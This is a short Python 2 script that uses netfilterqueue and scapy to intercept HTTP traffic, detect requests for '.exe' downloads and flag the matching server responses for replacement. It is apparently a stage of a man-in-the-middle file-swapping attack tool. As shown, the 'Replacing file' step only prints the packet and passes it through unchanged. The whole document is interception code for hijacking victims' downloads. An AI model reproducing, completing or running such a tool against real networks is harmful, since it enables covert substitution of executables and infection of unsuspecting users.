#! /usr/bin/env python
# WARNING: Not compatible with Python 3.x

import netfilterqueue
import scapy.all as scapy

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Could be converted to walrus assignment in 3.8.
                print("[+] Replacing file")
                print(scapy_packet.show())

    packet.accept()


print("Queue has been created.")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
